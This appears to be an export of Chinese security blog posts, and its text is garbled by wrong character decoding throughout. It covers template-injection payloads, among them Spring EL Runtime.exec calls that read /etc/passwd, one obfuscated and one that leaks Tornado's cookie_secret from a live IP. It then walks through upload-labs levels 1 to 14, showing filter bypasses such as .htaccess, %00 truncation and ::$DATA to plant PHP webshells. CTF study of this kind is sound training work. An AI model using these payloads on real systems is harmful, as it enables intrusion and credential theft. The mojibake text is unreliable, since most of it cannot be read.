å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° è¿™é‡Œæ˜ç¡®å†™ç€ handler å¯¹åº”çš„å°±æ˜¯ RequestHandler,é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ handler è°ƒç”¨ RequestHandler çš„æ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜æ˜¯çœ‹å®˜æ–¹æ–‡æ¡£ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° å¾ˆæ¸…æ¥šï¼Œæˆ‘ä¹ˆçœ‹åˆ° RequestHandler.settings æ˜¯ self.application.settings çš„åˆ«åï¼Œç­‰ç­‰ï¼ æœ‰æ²¡æœ‰è§‰å¾—æœ‰äº›ä¼¼æ›¾ç›¸è¯†ï¼Ÿå¯¹å•Šï¼Œè¿™ä¸å°±æ˜¯æˆ‘ä»¬ä¹‹å‰åœ¨æ¡†æ¶æºç ä¸­æ‰¾åˆ°çš„é‚£ä¸ªä¸œè¥¿å—ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½ç›´æ¥é€šè¿‡ handler.settings è®¿é—®åˆ° æˆ‘ä»¬æœæ€æš®æƒ³çš„ cookie_secret ï¼Œè‡³æ­¤æˆ‘çš„åˆ†æå°±ç»“æŸäº†ã€‚ payload: 1http://117.78.26.79:31093/error?msg={{handler.settings}} 2.åˆ©ç”¨æ¨¡è¯­è¨€æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»1.PythonPython æœ€æœ€ç»å…¸çš„å°±æ˜¯ä½¿ç”¨é­”æ³•æ–¹æ³•ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°Pythonæ²™ç›’ç»•è¿‡äº†ï¼Œå‰é¢è¯´è¿‡ï¼Œæ¨¡æ¿çš„è®¾è®¡è€…ä¹Ÿå‘ç°äº†æ¨¡æ¿çš„æ‰§è¡Œå‘½ä»¤çš„ç‰¹æ€§ï¼Œäºæ˜¯å°±ç»™æ¨¡æœ¬å¢åŠ äº†ä¸€ç§æ²™ç›’çš„æœºåˆ¶ï¼Œåœ¨è¿™ä¸ªæ²™ç›’ä¸­ä½ å¾ˆéš¾æ‰§è¡Œä¸€èˆ¬æˆ‘ä»¬èƒ½æƒ³åˆ°å‡½æ•°ï¼ŒåŸºæœ¬éƒ½è¢«ç¦ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸å¾—ä¸ä½¿ç”¨è‡ªçœçš„æœºåˆ¶æ¥ç»•è¿‡æ²™ç›’ï¼Œå…·ä½“çš„æ–¹æ³•å°±æ˜¯åœ¨æˆ‘çš„[ä¸€ç¯‡åšæ–‡](http://www.k0rz3n.com/2018/05/04/Python æ²™ç›’é€ƒé€¸å¤‡å¿˜/)ä¸­ 2.JAVAjava.langåŒ…æ˜¯javaè¯­è¨€çš„æ ¸å¿ƒï¼Œå®ƒæä¾›äº†javaä¸­çš„åŸºç¡€ç±»ã€‚åŒ…æ‹¬åŸºæœ¬Objectç±»ã€Classç±»ã€Stringç±»ã€åŸºæœ¬ç±»å‹çš„åŒ…è£…ç±»ã€åŸºæœ¬çš„æ•°å­¦ç±»ç­‰ç­‰æœ€åŸºæœ¬çš„ç±» å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° æœ‰äº†è¿™ä¸ªåŸºç¡€æˆ‘ä»¬å°±èƒ½æƒ³åˆ°è¿™æ ·çš„payload payloadï¼š 123${T(java.lang.System).getenv()}${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')} å½“ç„¶è¦æ˜¯æ–‡ä»¶æ“ä½œå°±è¦ç”¨å¦å¤–çš„ç±»äº†,æ€è·¯æ˜¯ä¸å˜çš„ payloadï¼š 1${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} æ³¨æ„: è¿™é‡Œé¢çš„ T() æ˜¯ EL çš„è¯­æ³•è§„å®šï¼ˆæ¯”å¦‚ Spring æ¡†æ¶çš„ EL å°±æ˜¯ SPEL) å‚è€ƒ:https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF","link":"/2021/04/01/ssti%E6%B3%A8%E5%85%A5%E7%BB%AD/"},{"title":"upload-labs1","text":"æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†æˆå› 1.æœåŠ¡å™¨é…ç½®ä¸å½“ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼ 2.webåº”ç”¨å¼€æ”¾äº†æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œå¹¶å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„é™åˆ¶å’Œè¿‡æ»¤3.webåº”ç”¨å¼€æ”¾äº†æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œè™½ç„¶åœ¨å¼€å‘æ—¶åŠ å…¥äº†ä¸€å®šçš„è¿‡æ»¤åŠŸèƒ½ï¼Œä½†å¹¶ä¸ä¸¥æ ¼ï¼Œå¯ä»¥è¢«ç»•è¿‡4.ä¸Šä¼ æ–‡ä»¶æ—¶å¦‚æœæœåŠ¡ç«¯ä»£ç æœªå¯¹å®¢æˆ·ç«¯ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œå°±å®¹æ˜“é€ æˆå¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶çš„æƒ…å†µï¼ŒåŒ…æ‹¬ä¸Šä¼ è„šæœ¬æ–‡ä»¶ï¼ˆaspã€aspxã€phpã€jspç­‰æ ¼å¼çš„æ–‡ä»¶ï¼‰ã€‚https://blog.csdn.net/qq_36119192/article/details/84593150ä¸Šé¢è¿™ä¸ªæ˜¯å…³äºé‚£å‡ ä¸ªåç¼€çš„æ–‡ä»¶çš„è¯´æ˜ äº§ç”Ÿæ¡ä»¶1.webæœåŠ¡å™¨è¦å¼€å¯æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œå¹¶ä¸”ä¸Šä¼ APIï¼ˆæ¥å£ï¼‰å¯¹å¤–å¼€æ”¾ï¼Œå³webç”¨æˆ·å¯ä»¥è®¿é—®ï¼›2.webç”¨æˆ·å¯¹ç›®æ ‡ç›®å½•å…·æœ‰å¯å†™æƒé™ï¼Œç”šè‡³å…·æœ‰æ‰§è¡Œæƒé™ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œwebç›®å½•éƒ½å…·æœ‰æ‰§è¡Œæƒé™ï¼›3.æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åœ¨æœåŠ¡å™¨çš„ç³»ç»Ÿç¯å¢ƒé‡Œèƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œå³webå®¹å™¨èƒ½å¤Ÿè§£ææˆ‘ä»¬ä¸Šä¼ çš„è„šæœ¬ï¼Œä¸è®ºè„šæœ¬ä»¥ä»€ä¹ˆæ ·çš„å½¢å¼å­˜åœ¨ã€‚ å±å®³æ¶æ„çš„è„šæœ¬æ–‡ä»¶ï¼Œåˆè¢«ç§°ä¸ºwebshellï¼Œwebshellè„šæœ¬ç§°ä¸ºä¸€ç§ç½‘é¡µåé—¨ï¼Œwebshellè„šæœ¬å…·æœ‰éå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æŸ¥çœ‹æœåŠ¡å™¨ç›®å½•ã€æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç­‰å¯¼å›¾ https://xz.aliyun.com/t/2435?spm=5176.12901015.0.i12901015.74b5525csqU5p2 upload-labs1æ­¥éª¤å…¶å®å¾ˆç®€å•ï¼Œä¹‹å‰åœ¨å­¦ä¸€å¥è¯æœ¨é©¬çš„æ—¶å€™å·²ç»æœ‰å­¦ä¹ è¿‡äº†æµç¨‹æ˜¯ï¼šåœ¨txtæ–‡æœ¬ä¸­å†™ä¸‹ä¸€å¥è¯ä»£ç â€”â€”&gt;å°†åç¼€æ”¹ä¸ºjpgç­‰å›¾ç‰‡æ ¼å¼çš„åç¼€â€”â€”&gt;ç„¶åä¸Šä¼ ï¼Œåœ¨ä¸Šä¼ çš„æ—¶å€™æŠ“åŒ…ï¼Œåœ¨burpé‡Œé¢å°†åç¼€ä¿®æ”¹ä¸ºphpï¼Œä½¿å…¶åœ¨åé¢èƒ½å¤Ÿè¢«è¿è¡Œâ€”â€”&gt;ç„¶ååˆ©ç”¨èšå‰‘ç­‰å·¥å…·è¿æ¥ä¸€å¥è¯æœ¨é©¬å³å¯ã€‚ å°†åç¼€æ”¹ä¸ºphp å¹¶å‘é€ ç„¶ååœ¨èšå‰‘ä¸­è¿æ¥ å¥½äº† æˆåŠŸäº†ä»¥ä¸Šä¸ºæ–¹æ³•ä¸€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨burpä¸­ä¿®æ”¹åç¼€ï¼Œä»è€Œè¾¾åˆ°æ³¨å…¥çš„æ•ˆæœè¿™é‡Œå°±ç®€è¿°ä¸€ä¸‹å§ï¼Œå› ä¸ºä¹‹å‰æ‰“è¿‡ä¸€éäº†å¿˜è®°ä¿å­˜å°è±¡è¿˜æŒºæ·±åˆ»çš„ï¼šæ–¹æ³•äºŒï¼šæˆ‘ä»¬åœ¨index.phpçœ‹åˆ°ä¸€ä¸ªchekfileçš„è¿‡æ»¤å‡½æ•°ï¼Œç„¶åå†show_codeé‡Œé¢çœ‹åˆ°ä¸€ä¸ªJavaScriptå†™çš„ç½‘é¡µä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼ŒPHPä¸­çš„ä»£ç åœ¨JavaScriptä¸­å‘æŒ¥ä½œç”¨ï¼Œè€Œåœ¨å®¡æŸ¥å…ƒç´ ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°JavaScriptçš„å‡½æ•°è°ƒç”¨å½“æˆ‘ä»¬æŠŠä»–åˆ é™¤æ‰åï¼Œä¹Ÿå°±ä¸å­˜åœ¨è¿‡æ»¤è¿™ä¸€è¯´ï¼Œç›´æ¥ä¸Šä¼ å³å¯äº†æ–¹æ³•ä¸‰ï¼Œç›´æ¥ç¦ç”¨JavaScriptå‡½æ•°è°ƒç”¨æ€è€ƒï¼šPHPï¼ŒJavaScriptçš„è”åŠ¨æ“ä½œ upload-labs2ç¬¬äºŒå…³æç¤ºä¸­è¯´å¯¹MIMEè¿›è¡Œæ£€æŸ¥ä»€ä¹ˆæ˜¯MIMEï¼Ÿä½¿ç”¨MIME (Multipurpose Internet Mail Extensions) æ˜¯æè¿°æ¶ˆæ¯å†…å®¹ç±»å‹çš„å› ç‰¹ç½‘æ ‡å‡†ï¼Œä½¿ç”¨MIMEç±»å‹å¯ä»¥è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚ åœ¨JSPé¡µé¢ä¸­ï¼ŒcontentTypeå±æ€§è®¾ç½®ä¸ºï¼šcontentType=â€œtext/html;charset=GBKâ€ã€‚ æ‰€ä»¥è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š1.**ï¼šæˆ‘ä»¬è¿˜æ˜¯ä¸Šä¼ jpgç„¶åæŠ“åŒ…æ›´æ”¹åç¼€ä¸ºphpï¼Œå› ä¸ºè¿™ä¸ªæ—¶å€™MIME-Typeå·²ç»å˜ä¸ºimage/jpegé¿å¼€è¿‡æ»¤äº†**2.**æˆ‘ä»¬ä¹Ÿå¯ç›´æ¥ä¿®æ”¹MIME-Typeä¸­çš„ç±»å‹ï¼Œå°†å…¶ä¿®æ”¹ä¸ºimage/jpegä¾æ—§æ˜¯å¯ä»¥æˆåŠŸçš„æ¥ç€çœ‹ä¸€ä¸‹æºä»£ç **move_uploaded_file()å‡½æ•°å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°çš„ä½ç½®è¯­æ³•ï¼šmove_uploaded_file(file,newloc) file å¿…éœ€ã€‚è§„å®šè¦ç§»åŠ¨çš„æ–‡ä»¶ã€‚ newloc å¿…éœ€ã€‚è§„å®šæ–‡ä»¶çš„æ–°ä½ç½®ã€‚ newloc å¿…éœ€ã€‚è§„å®šæ–‡ä»¶çš„æ–°ä½ç½®ã€‚ move_uploaded_file()å‡½æ•°æ¼æ´ upload-labs3é»‘åå•åŸºäºé»‘åå•éªŒè¯ï¼šåªé’ˆå¯¹é»‘åå•ä¸­æ²¡æœ‰çš„åç¼€åï¼Œæ–‡ä»¶æ‰èƒ½ä¸Šä¼ æˆåŠŸã€‚ä»è¿™é‡Œå¼€å§‹ æˆ‘ä»¬å°±è¿›å…¥äº†é»‘åå•çš„å…³å¡ï¼šçœ‹çœ‹ä»£ç å§å› ä¸ºå·²ç»å†™è¿‡ä¸€éæˆ‘å°±å¤§æ¦‚è¯´ä¸€ä¸‹ï¼šä»–æ˜¯å®šä¹‰ä¸€ç»„åç¼€åï¼Œç„¶åå¯¹äºä¼ è¾“è¿‡å»çš„æ–‡ä»¶ï¼Œç»è¿‡åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œä»æ–‡ä»¶çš„ç‚¹å¼€å§‹å‘åæˆªå–ï¼Œä»¥åŠå°†æ–‡ä»¶åå…¨éƒ¨è½¬åŒ–æˆå°å†™ï¼Œæœ€åç§»é™¤æ—è¾¹çš„ç©ºæ ¼ã€‚å…¶ä¸­strrchr()å‡½æ•°çš„ä½œç”¨å°±æ˜¯æœç´ å¹¶çªƒå–æœç´¢ç‚¹åŠä»¥åçš„ä½ç½®ä»–ç¦ç”¨äº†æŒºå¤šçš„ç±»å‹çš„åç¼€çš„ä½†æ˜¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–åç¼€è¿›è¡Œç»•è¿‡phtml,php3,php4,php5,pht upload-labs 4åœ¨è¿™ä¸€å…³ä¸­ å°†å¾ˆå¤šphpçš„æ‹“å±•å½¢å¼éƒ½è¿‡æ»¤äº†è¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦å¼•è¿›ä¸€ä¸ª.htaccessæ–‡ä»¶ä½œç”¨ï¼šhtaccessæ–‡ä»¶æ—¶ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹ç½‘é¡µé…ç½®ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ç½‘é¡µ301é‡å®šå‘ï¼Œè‡ªå®šä¹‰404é”™è¯¯é¡µé¢ï¼Œæ”¹å˜æ–‡ä»¶æ‰©å±•åç­‰åŠŸèƒ½ï¼Œå…¶ä¸­.htaccessæ–‡ä»¶å†…å®¹:SetHandler application/x-httpd-phpè®¾ç½®å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨PHPè§£æï¼Œæ— è®ºä¸Šä¼ ä»»ä½•æ–‡ä»¶ï¼Œåªè¦ç¬¦åˆphpè¯­è¨€ä»£ç è§„èŒƒï¼Œå°±ä¼šè¢«å½“åšphpæ–‡ä»¶æ‰§è¡Œã€‚https://blog.csdn.net/cmzhuang/article/details/53537591ï¼ˆæ·±å±‚ç†è§£åšå®¢ï¼‰ ä¸Šä¼ .htaccessæ–‡ä»¶æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼šSetHandler application/x-httpd-phpPSï¼šè¿™é‡Œéœ€è¦å°†ä¸Šä¼ çš„æ–‡ä»¶ä¸ç”¨å‰ç¼€ å³.htaccessæŒ‡å®šæ–‡ä»¶è¿›è¡Œphpçš„è½¬åŒ–ï¼šåœ¨å†™å…¥.htaccessçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ &lt;FilesMatch &quot;shuaige&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; å†™å‡ºè¿™æ®µä»£ç ï¼Œæ³¨æ„åˆ°å¼€å¤´â€shuaigeâ€æ„ä¸ºå«æœ‰æ–‡ä»¶å†…å«æœ‰shuaigeçš„æ–‡ä»¶éƒ½ä¼šè¢«è§£æä¸ºphpæ–‡ä»¶è¿™é‡Œè¦ä½¿ç”¨è¿™ä¸ª.htaccessè¦è®°å¾—å»apacheé‡Œé¢é…ç½®ä¸€ä¸‹ upload-labs5åœ¨è¿™å…³å½“ä¸­ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ï¼Œä»–è¿‡æ»¤ç©ºæ ¼å’Œ.åªè¿‡æ»¤äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„å»º123.php. .çš„å½¢å¼è¿›è¡Œç»•è¿‡è¿‡æ»¤ upload-labs6åœ¨ç¬¬å…­å…³ä¸­ï¼Œå‘ç°ä»–æ˜¯æ²¡æœ‰å¯¹å¤§å°å†™è¿›è¡Œè¿‡æ»¤çš„æ‰€ä»¥æˆ‘ä»¬ åœ¨åç¼€åšç‚¹æ‰‹è„šå³å¯ ç„¶åæŠ“åŒ…æ”¹å›å³å¯ upload-labs7åœ¨ç¬¬ä¸ƒå…³ä¸­æ²¡æœ‰å»ç©ºï¼Œæ‰€ä»¥å¯ä»¥åœ¨åç¼€åŠ ä¸ªç©ºæ ¼ï¼Œç„¶åæŠ“åŒ…æ”¹å› upload-labs8è¿™å…³æ˜¯åœ¨æ–‡ä»¶ååŠ ä¸ª. åœ¨windowsç³»ç»Ÿä¸­ï¼Œä¼šè‡ªåŠ¨æŠŠ.ç»™åˆ é™¤æ‰ï¼Œæ‰€ä»¥å¯ä»¥å…ˆæŠ“åŒ…åŠ ä¸ª.ç»•è¿‡è¿‡æ»¤ï¼Œç„¶åæ–‡ä»¶ä¸Šä¼ åˆ°ç›®å½•åï¼Œ.ä¼šè‡ªåŠ¨è¢«åˆ é™¤ upload-labs9åœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+&quot;::$DATA&quot;ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ::$DATAä¹‹å‰çš„æ–‡ä»¶åï¼Œä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€åç„¶åæˆ‘ä»¬ç‚¹å‡»ä¸Šä¼ å›¾åƒåçš„æ–‡ä»¶ï¼Œç‚¹å‡»æŸ¥çœ‹å›¾åƒï¼Œåˆ é™¤åé¢çš„::$DATAå³å¯æ­¤æ—¶æœ‰ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ åï¼Œæ–‡ä»¶åå˜æˆéšæœºæ•°å­—äº†å‘¢ï¼ŸåŸå› å°±åœ¨è¿™ä¸€å¼€å§‹çŒœæµ‹æ˜¯æœ‰å…¶ä»–ä¿æŠ¤æœºåˆ¶ï¼ŒæŸ¥çœ‹æºç  æœç„¶å¦‚æ­¤ä½†æ˜¯ä¿®æ”¹åçš„æ–‡ä»¶åå¯ä»¥ ä½¿ç”¨burp çš„goå å¯ä»¥æŸ¥æ‰¾å¾—åˆ° upload-labs10è¿™ä¸€é¢˜å’Œç¬¬äº”é¢˜çš„è§£é¢˜æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æ³¨æ„åˆ°å®ƒçš„æºç æœ‰äº›åœ°æ–¹ä¸å¤ªä¸€æ ·äº†å°±æ˜¯ä»–çš„è·¯å¾„å˜æˆæ˜¯ç›´æ¥åŠ file.nameï¼Œæ„Ÿè§‰è¿˜æ˜¯ä¸Šä¸€ä¸ªä¿æŠ¤æœºåˆ¶æ›´å¼ºä¸€äº›ï¼Œè™½ç„¶ç”¨å¤„ä¹Ÿä¸å¤§å“ˆå“ˆå“ˆ upload-labs11é¦–å…ˆæ¥åˆ†æä¸€ä¸‹æºç å…¶ä¸­æœ‰ä¸€ä¸ªstr_ireplace() å®ƒçš„ä½œç”¨æ˜¯è¿™æ ·çš„ï¼šå°†file_nameä¸­ç¬¦åˆdeny_extæ ¼å¼çš„å…¨éƒ¨æ›¿æ¢æˆç©º è€Œåœ¨ä¸Šé¢ å®ƒæ˜¯å°†ä¸¤è¾¹çš„ç©ºæ ¼å…¨éƒ¨å»æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¶å®å¯ä»¥ä½¿ç”¨**åŒå†™**çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼š ä¸Šä¼ æˆåŠŸ å¹¶ä¸”å¯ä»¥æˆåŠŸæ˜¾ç¤º è¿™å°±è®©äººè”æƒ³åˆ°sqlç»•è¿‡è¿‡æ»¤äº†ã€‚ ä¸ºä»€ä¹ˆè¦é‡‡å–æ›¿æ¢ä¸ºç©ºçš„æ–¹å¼ï¼Ÿå› ä¸ºå¦‚æœä¸ºç©ºåç¼€ æ˜¯ä¸ç¬¦åˆæ ¼å¼ï¼Œç›´æ¥å°±ä¸Šä¼ å¤±è´¥äº† upload-labs12ç™½åå•åŸºäºç™½åå•éªŒè¯ï¼šåªé’ˆå¯¹ç™½åå•ä¸­æœ‰çš„åç¼€åï¼Œæ–‡ä»¶æ‰èƒ½ä¸Šä¼ æˆåŠŸã€‚ å‰é¢ éƒ½æ˜¯å¯¹äºæ–‡ä»¶åç¼€åçš„è¿‡æ»¤ï¼Œé¦–å…ˆæ˜¯ä½¿ç”¨substr()å’Œstrrpos()æˆªå–åç¼€è¿›è¡Œç™½åå•åŒ¹é…ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆèƒ½æ“ä½œçš„ç©ºé—´ï¼Œå†å¾€ä¸‹çœ‹ï¼Œçœ‹åˆ°ä¸€ä¸ªåœ¨img_pathä¸­ file_extæ˜¯å¯æ§çš„ï¼è¿™é‡Œå°±è¦ä»‹ç»ä¸€ä¸‹ æˆªæ–­ä¸Šä¼ å‰ææ¡ä»¶ï¼šphp ç‰ˆæœ¬ &lt; 5.3.4ä¸”phpçš„å‚æ•°magic_quotes_gpcå¿…é¡»å…³é—­ åœ¨urlä¸­%00è¡¨ç¤ºascllç ä¸­çš„0 ï¼Œè€Œasciiä¸­0ä½œä¸ºç‰¹æ®Šå­—ç¬¦ä¿ç•™ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸï¼Œæ‰€ä»¥å½“urlä¸­å‡ºç°%00æ—¶å°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸï¼Œè€Œå¿½ç•¥åé¢ä¸Šä¼ çš„æ–‡ä»¶æˆ–å›¾ç‰‡ï¼Œåªä¸Šä¼ æˆªæ–­å‰çš„æ–‡ä»¶æˆ–å›¾ç‰‡ä¸€ä¸‹ä¸ºä¾‹å­ï¼š æ­¤æ—¶ path=&quot;upload/web/&quot;file=&quot;1.jpg&quot; æ­¤æ—¶å¦‚æœæˆ‘å°†è·¯å¾„æ”¹ä¸ºï¼Œpath=â€upload/web/1.php%00â€,é‚£ä¹ˆæ‹¼æ¥ä¸Šå»ä¹‹åå°±å˜æˆâ€upload/web/1.php%001.jpgâ€ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±ç›¸å½“äºæ˜¯ä¸Šä¼ çš„æ˜¯1.phpï¼Œè€Œ1.jpgçš„jpgè¢«æˆªæ–­äº†ï¼Œå…¶å®ç±»ä¼¼äºmysqlçš„æ³¨é‡Šç¬¦å§ æ³¨æ„ä¸‹è¿™é‡Œæ˜¯getå½¢å¼ä¸Šä¼ çš„ å‚è€ƒé“¾æ¥ï¼šhttps://bealright.github.io/2019/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94upload-labs(11-20)/ upload-labs13è¿™ä¸€é¢˜å’Œä¸Šä¸€é¢˜æ²¡å¤šå¤§åŒºåˆ«ï¼Œä¾æ—§å‚æ•°å¯æ§ï¼Œä¸è¿‡ä¸Šä¸€é¢˜æ˜¯getå½¢å¼ï¼Œè€Œè¿™é¢˜æ˜¯POSTé‚£ä¹ˆåŒºåˆ«æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿï¼šå› ä¸ºpostä¸ä¼šåƒgetå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥éœ€è¦ç”¨16è¿›åˆ¶è¿›è¡Œè§£ç è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†burpsuitæŠ“åŒ…ä»¥åå°†å…¶å‘é€è‡³decoderï¼Œå°†phpåçš„16è¿›åˆ¶ç æ”¹ä¸º00å³å¯å°†20æ”¹ä¸º00å³å¯è¡¥å……ä¸€å¼ æˆªå›¾ï¼Œè¿™é‡Œçš„aåªæ˜¯ä¸ºäº†è¯´æ˜ç©ºæ ¼çš„ä½ç½®ï¼Œç©ºæ ¼å…¶å®ä¹Ÿå¯ä»¥æ›¿æ¢ä¸ºå…¶ä»–çš„ï¼Œå› ä¸ºæˆ‘ä»¬åé¢ä¼šå°†è¿™ä¸ªä½ç½®çš„å†…å®¹æ¢æˆ00ï¼Œåé¢çš„å†…å®¹å‡ä¼šè¢«æˆªæ–­ upload-labs14 åˆ†ææºç ï¼Œfopenä¸ºä»€ä¹ˆåé¢ä½¿ç”¨çš„æ˜¯rbï¼Ÿ â€œrâ€ï¼Œå³æ–‡æœ¬è¯»å–æ¨¡å¼ï¼Œåº”è¯¥ä½¿ç”¨â€œrbâ€æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶è¯»å–æ¨¡å¼æ‰“å¼€æ–‡ä»¶ã€‚ å‘ç°ä»–åªè¯»ä¸¤ä¸ªå­—èŠ‚ unpackï¼šä»äºŒè¿›åˆ¶å­—ç¬¦ä¸²å¯¹æ•°æ®è¿›è¡Œè§£åŒ…ï¼ˆç”¨ä»€ä¹ˆæ‰“åŒ…å°±ç”¨ä»€ä¹ˆè§£åŒ…ï¼‰ï¼ŒåŠ @çš„åŸå› å°±æ˜¯è®©å…¶æ€ä¹ˆéƒ½å¯ä»¥æ‰§è¡Œä¸æŠ¥é”™å’Œä¸€å¥è¯æœ¨é©¬çš„é‚£ä¸ªä¸€ä¸ªæ„æ€ è€Œè¿™é‡Œçš„unpackçš„æ„æ€æ˜¯ å°†$binä¸­çš„ä»¥äºŒè¿›åˆ¶çš„å½¢å¼è§£åŒ…è¾“å‡ºåˆ°charsä¸­ã€‚ è€Œä¸‹é¢è¿™ä¸ªintvalæ˜¯è½¬åŒ–åè¿›åˆ¶çš„æ„æ€ï¼Œå°†æœ¬æ¥è¾“å‡ºçš„äºŒè¿›åˆ¶å†è½¬åŒ–ä¸ºåè¿›åˆ¶ï¼Œæ¥ä¸‹æ¥é€šè¿‡è¿™ä¸ªè¿›è¡Œå¯¹æ¯” **æˆ‘ä¸€ç›´åœ¨æƒ³å¦‚æœæ˜¯ç›´æ¥è§£ææ–‡ä»¶å†…å®¹ï¼Œéƒ½æ²¡è§£æåç¼€ï¼Œæ€ä¹ˆçŸ¥é“æ˜¯ä»€ä¹ˆæ–‡ä»¶ï¼Œç­”æ¡ˆæ˜¯è¿™æ ·çš„** å…¶å®,æ–‡ä»¶å¯¹è‡ªèº«æ–‡ä»¶å†…å®¹,æœ‰ç€è‡ªå·±çš„æ–‡ä»¶å¤´æ ‡è¯†,æˆ‘ä»¬åªéœ€è¦æ–‡ä»¶è½¬ä¸º16è¿›åˆ¶,ç„¶åçœ‹å„ä¸ªæ–‡ä»¶ç±»å‹å¯¹æ–‡ä»¶å¤´çš„å®šä¹‰,å°±å¯ä»¥çŸ¥é“æ–‡ä»¶çš„ç±»å‹äº†,ä¾‹å¦‚,jpegå›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶å¤´(2byte)æ ‡è¯†ä¸º:0xff, 0xd8,ç»“å°¾(2byte)æ ‡è¯†ä¸º:0xff,0xd9 è€Œè½¬åŒ–ä¸ºäºŒè¿›åˆ¶å†è½¬åŒ–ä¸ºåè¿›åˆ¶ä¹Ÿæ˜¯ä¸€æ ·çš„ 